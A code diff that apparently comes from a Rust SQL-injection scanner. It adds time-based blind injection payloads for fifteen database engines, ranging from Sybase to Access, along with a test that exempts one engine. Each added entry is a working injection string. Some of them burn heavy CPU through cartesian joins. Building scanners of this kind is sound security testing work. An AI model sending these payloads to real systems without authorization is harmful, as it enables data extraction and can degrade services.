@@ -118,6 +118,100 @@ pub fn generate() -> Vec<GeneratedPayload> {
             H2,
             Subquery,
         ),
+        // --- sqlmap-parity engine families (2026-09-25) ------------------------
+        // Every entry below is the primitive sqlmap uses for the same engine,
+        // re-stated as a probe so an engine we cannot sleep on still gets a
+        // timing channel.
+        probe(
+            "time-sybase-waitfor",
+            "' IF(1=1) WAITFOR DELAY '0:0:5'-- -",
+            Sybase,
+            CaseWhen,
+        ),
+        probe(
+            "time-sybase-heavy",
+            "' AND 5=(SELECT COUNT(*) FROM sysusers s1,sysusers s2,sysusers s3,sysusers s4,sysusers s5,sysusers s6,sysusers s7)-- -",
+            Sybase,
+            Subquery,
+        ),
+        probe(
+            "time-firebird-iif-heavy",
+            "' AND 5=IIF((1=1),(SELECT COUNT(*) FROM RDB$FIELDS T1,RDB$TYPES T2,RDB$COLLATIONS T3,RDB$FUNCTIONS T4),5)-- -",
+            Firebird,
+            CaseWhen,
+        ),
+        probe(
+            "time-informix-heavy",
+            "' AND 5=(CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE 5 END)-- -",
+            Informix,
+            CaseWhen,
+        ),
+        probe(
+            "time-hsqldb-cpu",
+            "' AND 'a'=CASE WHEN (1=1) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),500000000),NULL) ELSE 'a' END-- -",
+            HSQLDB,
+            CaseWhen,
+        ),
+        probe(
+            "time-maxdb-heavy",
+            "' AND 5=(SELECT COUNT(*) FROM DOMAIN.DOMAINS T1,DOMAIN.COLUMNS T2,DOMAIN.TABLES T3)-- -",
+            MaxDB,
+            Subquery,
+        ),
+        probe(
+            "time-hana-heavy",
+            "' AND 5=(SELECT COUNT(*) FROM SYS.OBJECTS T1,SYS.OBJECTS T2,SYS.OBJECTS T3 WHERE LOWER(T1.OBJECT_NAME)!=UPPER(T2.OBJECT_NAME))-- -",
+            SAPHANA,
+            Subquery,
+        ),
+        probe(
+            "time-clickhouse-sleepeachrow",
+            "' AND 5=(SELECT count() FROM numbers(5) WHERE sleepEachRow(1)=0 SETTINGS max_block_size=1)-- -",
+            ClickHouse,
+            Subquery,
+        ),
+        probe(
+            "time-cubrid-sleep",
+            "' AND 5=(SELECT IF((1=1),SLEEP(5),5) FROM db_root)-- -",
+            Cubrid,
+            CaseWhen,
+        ),
+        probe(
+            "time-virtuoso-heavy",
+            "' AND 5=(SELECT COUNT(*) FROM SYS_KEYS T1,SYS_KEYS T2,SYS_KEYS T3)-- -",
+            Virtuoso,
+            Subquery,
+        ),
+        probe(
+            "time-monetdb-heavy",
+            "' AND 5=(SELECT COUNT(*) FROM sys.tables T1,sys.tables T2,sys.tables T3)-- -",
+            MonetDB,
+            Subquery,
+        ),
+        probe(
+            "time-vertica-heavy",
+            "' AND 5=(SELECT COUNT(*) FROM v_catalog.tables T1,v_catalog.tables T2,v_catalog.tables T3)-- -",
+            Vertica,
+            Subquery,
+        ),
+        probe(
+            "time-presto-heavy",
+            "' AND 5=(SELECT COUNT(*) FROM information_schema.tables T1,information_schema.tables T2,information_schema.tables T3)-- -",
+            Presto,
+            Subquery,
+        ),
+        probe(
+            "time-spanner-heavy",
+            "' AND 5=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES T1,INFORMATION_SCHEMA.TABLES T2,INFORMATION_SCHEMA.TABLES T3)-- -",
+            Spanner,
+            Subquery,
+        ),
+        probe(
+            "time-access-heavy",
+            "' AND 5=(SELECT COUNT(*) FROM MSysObjects T1,MSysObjects T2,MSysObjects T3)-- -",
+            Access,
+            Subquery,
+        ),
     ]
 }
 
@@ -128,7 +222,18 @@ mod tests {
     #[test]
     fn covers_every_dbms_family() {
         let payloads = generate();
+        // InterSystems Cache is the documented exception: no sleep primitive
+        // and no catalogue table we can cite, so it has no timing channel
+        // rather than an invented one (see `dialects::DialectProfile`).
+        let exempt = [DbmsFamily::Cache];
         for fam in DbmsFamily::ALL {
+            if exempt.contains(fam) {
+                assert!(
+                    !payloads.iter().any(|p| p.expected_dbms == Some(*fam)),
+                    "an unverified timing payload was emitted for {fam:?}"
+                );
+                continue;
+            }
             assert!(
                 payloads.iter().any(|p| p.expected_dbms == Some(*fam)),
                 "no timing payload for {fam:?}"
